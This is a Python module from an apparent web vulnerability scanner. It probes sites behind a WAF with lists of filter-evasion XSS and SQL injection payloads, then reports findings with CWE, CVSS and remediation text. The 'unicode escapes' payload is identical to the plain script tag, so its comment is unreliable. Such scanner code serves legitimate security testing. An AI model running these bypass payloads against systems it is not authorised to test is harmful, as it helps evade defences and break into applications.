"""
WAF Bypass module.

When a WAF is detected in front of the target, plain injection payloads get
blocked before they reach the application. This module re-runs XSS and SQLi
probes with bypass-encoded variants and checks whether any slip through.

Bypass techniques applied:
  - Double URL encoding  (%253c → <)
  - HTML entities        (&#x3C; → <)
  - Unicode escapes      (< → <)
  - Case mutation        (<ScRiPt>)
  - Null-byte insertion  (payloads%00suffix)
  - Comment injection    (/**/ between SQL keywords)
  - Whitespace variants  (tabs, newlines in SQL)
"""
from __future__ import annotations

from typing import List
from urllib.parse import urlparse, parse_qs

from scanner.core.crawler import CrawlResult
from scanner.core.scan_result import Finding, Severity
from scanner.utils.http import inject_url_param, fetch

# Re-use waf detect probe
_WAF_PROBE = "'><script>alert(1)</script>/**/UNION/**/SELECT/**/1--"

# WAF-bypass XSS payloads
_BYPASS_XSS = [
    "%253cscript%253ealert(1)%253c/script%253e",              # double URL encode
    "<ScRiPt>alert(1)</ScRiPt>",                              # case mutation
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",         # HTML entities
    "<script>alert(1)</script>",          # unicode escapes
    "<scr\x00ipt>alert(1)</scr\x00ipt>",                      # null byte
    "<img src=x onerror=alert(1)//",                          # alternate tag
    "<svg/onload=alert(1)>",                                  # SVG
    "<<SCRIPT>alert(1)//<</SCRIPT>",                          # double-open
    "<script\t>alert(1)</script>",                            # tab in tag
    "<script\n>alert(1)</script>",                            # newline in tag
]

# WAF-bypass SQLi payloads
_BYPASS_SQLI = [
    "'/**/OR/**/1=1--",                   # comment-injected OR
    "'%09OR%091=1--",                     # tab-separated
    "'%0AOR%0A1=1--",                     # newline-separated
    "1'%20OR%20'1'='1",                   # URL-encoded spaces
    "1'/*!50000OR*/1=1--",                # MySQL version comment
    "1'+OORR+'1'='1",                     # doubled keyword
    "1' OR 0x31=0x31--",                  # hex comparison
    "';EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(49))--",  # EXEC char()
    "' OR 'unusual'='unusual'--",         # unusual string comparison
    "' OR 1=1#",                          # MySQL hash comment
]

# Error signatures indicating SQL injection slipped through
_SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "ora-",
    "pg_query",
]

# XSS confirmation markers
_XSS_MARKERS = [
    "<script>alert(1)</script>",
    "onerror=alert(1)",
    "onload=alert(1)",
    "&#x3c;script",
]


def _waf_present(page_url: str, client) -> bool:
    """Quick probe — returns True if the WAF is blocking the standard probe."""
    parsed = urlparse(page_url)
    if parsed.query:
        probe_url = inject_url_param(page_url, next(iter(parse_qs(parsed.query))), _WAF_PROBE)
    else:
        probe_url = page_url + "?q=" + _WAF_PROBE

    resp = fetch(client, "get", probe_url)
    if not resp:
        return False
    return resp.status_code in (403, 406, 429, 503)


def test(page: CrawlResult, client) -> List[Finding]:
    if not _waf_present(page.url, client):
        return []

    findings: List[Finding] = []
    parsed = urlparse(page.url)
    params = list(parse_qs(parsed.query).keys()) if parsed.query else ["q"]

    # -- XSS bypass attempts --
    for param in params:
        for payload in _BYPASS_XSS:
            probe_url = inject_url_param(page.url, param, payload)
            resp = fetch(client, "get", probe_url)
            if not resp:
                continue
            body = (getattr(resp, "text", "") or "").lower()
            if any(m.lower() in body for m in _XSS_MARKERS):
                findings.append(Finding(
                    title="XSS — WAF Bypass Successful",
                    severity=Severity.HIGH,
                    url=probe_url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Bypass payload reflected in response body. WAF did not block: {payload[:120]}",
                    description=(
                        "A WAF is present but a bypass-encoded XSS payload was reflected unfiltered "
                        "in the response, indicating the WAF's filter can be evaded."
                    ),
                    remediation=(
                        "Update WAF rule sets and implement server-side output encoding that does not "
                        "rely solely on the WAF for protection."
                    ),
                    cwe="CWE-79",
                    cvss=7.5,
                    owasp_category="A03:2021 Injection",
                    confidence=0.85,
                ))
                break  # one confirmed bypass per param is enough

    # -- SQLi bypass attempts --
    for param in params:
        for payload in _BYPASS_SQLI:
            probe_url = inject_url_param(page.url, param, payload)
            resp = fetch(client, "get", probe_url)
            if not resp:
                continue
            body = (getattr(resp, "text", "") or "").lower()
            if any(err in body for err in _SQLI_ERRORS):
                findings.append(Finding(
                    title="SQL Injection — WAF Bypass Successful",
                    severity=Severity.CRITICAL,
                    url=probe_url,
                    parameter=param,
                    payload=payload,
                    evidence=f"SQL error visible in response after WAF bypass. Payload: {payload[:120]}",
                    description=(
                        "A WAF is present but a bypass-encoded SQL injection payload triggered a "
                        "database error, indicating the WAF can be evaded and the underlying "
                        "application is vulnerable."
                    ),
                    remediation=(
                        "Use parameterised queries. Do not rely on the WAF as the sole SQL injection "
                        "defence. Update WAF rules to decode and inspect obfuscated payloads."
                    ),
                    cwe="CWE-89",
                    cvss=9.8,
                    owasp_category="A03:2021 Injection",
                    confidence=0.90,
                ))
                break

    return findings
